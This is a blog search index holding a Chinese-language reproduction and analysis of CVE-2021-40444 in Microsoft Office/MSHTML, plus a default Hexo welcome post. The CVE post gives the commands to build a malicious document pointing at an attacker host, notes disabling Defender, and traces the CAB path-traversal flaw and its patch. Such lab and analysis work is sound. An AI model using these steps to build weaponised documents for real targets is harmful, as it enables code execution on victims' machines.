<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2021-40444复现</title>
    <link href="/2022/11/14/test/"/>
    <url>/2022/11/14/test/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-40444复现"><a href="#CVE-2021-40444复现" class="headerlink" title="CVE-2021-40444复现"></a>CVE-2021-40444复现</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2021年9月8日，微软发布安全通告披露了Microsoft MSHTML远程代码执行漏洞，攻击者可通过制作恶意的ActiveX控件供托管浏览器呈现引擎的 Microsoft Office文档使用，成功诱导用户打开恶意文档后，可在目标系统上以该用户权限执行任意代码，微软在通告中指出已检测到该漏洞被在野利用，请相关用户采取措施进行防护。</p><p>MSHTML(又称为Trident)是微软旗下的Internet Explorer浏览器引擎，也用于Office应用程序，以在Word、Excel或PowerPoint文档中呈现Web托管的内容，AcitveX控件是微软COM架构下的产物，在Windows的Office套件、IE浏览器中有广泛的应用，利用ActiveX控件即可与MSHTML组件进行交互。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>win10（office10），kali2021（需要先安装lcab）</p><p>github地址：<a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></p><p>注意：这里win10要先关闭windows denfender，同时ie浏览器也要启动运行Activex控件和插件（默认启动）</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>克隆后在kali上执行命令</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">python3 exploit<span class="hljs-variable">.py</span> <span class="hljs-keyword">generate</span> test/calc<span class="hljs-variable">.dll</span> http:<span class="hljs-comment">//xxx.xxx.xxx.xxx:80</span><br></code></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20210916/1631770198_6142d6565c62e838487df.png!small" alt="image-20210916101732983"></p><p>可以看见在out目录下生成了document.docx文件;</p><p><img src="https://image.3001.net/images/20210916/1631770199_6142d657c95e6c935312d.png!small" alt="image-20210916101828485"></p><p>而后开启http服务</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> exploit.<span class="hljs-keyword">py</span> host <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>在win10上运行恶意文档，成功弹出计算器</p><p><img src="https://image.3001.net/images/20210916/1631770209_6142d661afebbca5cfa00.png!small" alt="image-20210916102734479.png"></p><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>将恶意文档用压缩软件解压缩，在rels的document.xml中可以发现链接</p><p>&#x3D;&#x3D;Target&#x3D;”mhtml:<a href="http://xxx.xxx.xxx.xxx(攻击机ip)/word.html!x-usc:http://xxx.xxx.xxx.xxx(%E6%94%BB%E5%87%BB%E6%9C%BAip)/word.html&quot;==">http://xxx.xxx.xxx.xxx(攻击机ip)/word.html!x-usc:http://xxx.xxx.xxx.xxx(攻击机ip)/word.html&quot;==</a></p><p>链接指向攻击机的一个网页，网页内js代码经过混淆。简单去混淆后基本结构如下，除了具体文件名称不同外基本相同。</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/87c7ea01690e53ab2f220b26bdddee28.png?imageView2/2/w/1620" alt="img"></p><p>发现会请求攻击机一个word.cab压缩包。打开docx就会触发get请求后会通过mshtml模块来处理。微软对cab文件的api处理如下：<a href="https://docs.microsoft.com/en-us/windows/win32/api/fdi/%EF%BC%8C%E8%BF%99%E4%BA%9Bapi%E5%8C%85%E6%8B%AC%E4%BA%86%E5%AF%B9cab%E6%96%87%E4%BB%B6%E7%9A%84%E8%A7%A3%E6%9E%90%E5%92%8C%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C%E7%AD%89%E3%80%82">https://docs.microsoft.com/en-us/windows/win32/api/fdi/，这些api包括了对cab文件的解析和读写操作等。</a></p><p>通过ProcessMonitor监控我们可以获得其创建和读取cab文件的行为，其调用堆栈如下：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/c2d4f164a3aa2257280270bc485f02a2.png?imageView2/2/w/1620" alt="img"></p><p>对cab文件的处理将会进入urlmon模块，urlmon模块通过调用cabinet模块中的api来处理cab文件。在urlmon!GetSupportedInstallScopesFromFile这个api开始处理cab文件：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/b209f403a6d0fcf6da628bdf0d5cec9a.png?imageView2/2/w/1620" alt="img"></p><p>获取到C:\Users\stone\AppData\Local\Microsoft\Windows\INetCache\IE\9FFFIV4G\word.cab先通过GetExtnAndBaseFileName去判断文件后缀名是不是cab：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/23699c253bacd48845de2a67980946f2.png?imageView2/2/w/1620" alt="img"></p><p>然后通过CreateUniqueCabTempDir创建临时文件夹，比如这里是C:\Users\stone\AppData\Local\Temp\Cab369A，进入api ExtractInfFile后，将会继续调用Extract，在Extract将会第一次调用到FDICreate和FDICopy,来获取cab的信息</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/c1b2e88ac888b8c7dbfbf62b5a0b0f2a.png?imageView2/2/w/1620" alt="img"></p><p>FDICreate主要是对其他读写api等进行初始化操作，而FDICopy主要是提取cab文件的信息</p><p>进入CABINET!FDICopy后将会调用LoginCabinet来提取cab的0x24大小的head信息，比如包括对头部MSCF标志的判断：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/b1739218935be3ef615c7710df48abb9.png?imageView2/2/w/1620" alt="img"></p><p>之后将会进入CABINET!LoginCabinet、CABINET!FDICallEnumerate分别对应信息FNFDINOTIFY的fdintCABINET_INFO、fdintENUMERATE，再一次进入urlmon!fdiNotifyExtract后获取CFFILE file的信息，而对应的标志是0x02：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/75b354fbc1208bd81e4ddfcf725651de.png?imageView2/2/w/1620" alt="img"></p><p>获取到初始化结构体后将会在urlmon!ExtractInfFile调用urlmon!ExtractOneFile：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/4c637cb07a52507e17e2d69a1f1e06b8.png?imageView2/2/w/1620" alt="img"></p><p>而在urlmon!ExtractOneFile中将会给(a4+0x202)赋值结构体lpsz，将会确保在调用urlmon!NeedFile成功返回：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/14324fe508a75fb401c4ee2f14e35c8e.png?imageView2/2/w/1620" alt="img"></p><p>之后将会继续以标志fdintCOPY_FILE(0x02)继续调用urlmon!fdiNotifyExtract，继续调用urlmon!catDirAndFile继续路径字符串格式化，而我们传入的inf路径是C:\Users\stone\AppData\Local\Temp\Cab45F3\..&#x2F;msword.inf</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/5223b867b93d426de11b57e07560d577.png?imageView2/2/w/1620" alt="img"></p><p>最后退出urlmon!catDirAndFile将会在urlmon!fdiNotifyExtract中调用Win32Open：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/b0e8087b560ac07d3a5796f3611faadd.png?imageView2/2/w/1620" alt="img"></p><p>而在Win32Open中将会调用CreateFileA，以路径C:\Users\stone\AppData\Local\Temp\Cab45F3\..&#x2F;msword.inf创建文件msword.inf，因为路径存在目录遍历问题，所以将会在C:\Users\stone\AppData\Local\Temp\msword.inf创建文件：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/54a15c2ca2c71205fc249abaed1d6ce4.png?imageView2/2/w/1620" alt="img"></p><p>成功创建msword.inf文件后将会继续成功调用CABINET!FDIGetFile，在CABINET!FDIGetFile中将会以第一个CFDATA data大小数据写入到文件中，之后caFile(实际为解压文件大小)将会减去写入的CFDATA data大小，接着进行比较直到将所有的caFile大小写入，而这里我们的caFile大小是0x415c0000,远远大于实际的CFDATA的总大小，所以将会在调用最后一次CABINET!FDIGetDataBlock获取块的时候失败并退出：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/69900abab76dc8a09de4cadd2cff10f8.png?imageView2/2/w/1620" alt="img"></p><p>虽然退出了，但不影响实际写入文件的数据，并且因为这个失败将不会在urlmon!DeleteExtractedFiles调用DeleteFileA,因为v2[2]的标志未清0，所以不会删除临时文件，从而我们创建的msword.inf得以保存，并且在后续中可以直接以cpl文件运行C:\Users\stone\AppData\Local\Temp\msword.inf</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/a9c74736356967b4b09c045790b1cedb.png?imageView2/2/w/1620" alt="img"></p><p>而正常的提取cab文件将会以标志fdintCLOSE_FILE_INFO(0x03)进入，调用urlmon!MarkExtracted，将标志清0：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/7acba5fc15fa4a5682276ff4dee10acc.png?imageView2/2/w/1620" alt="img"></p><h2 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h2><p>微软发布了cve-2021-40444的补丁，经过补丁分析发现，urlmon.dll模块的catDirAndFile对路径验证做了修改,将’&#x2F;‘替换成了’\\‘,防止路径遍历：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/8c4be36e3b5b6d02dafbdb3ce808221b.png?imageView2/2/w/1620" alt="img"></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1442004/41966c70f2746bf772eb1bac85d3b894.png?imageView2/2/w/1620" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/11/14/hello-world/"/>
    <url>/2022/11/14/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
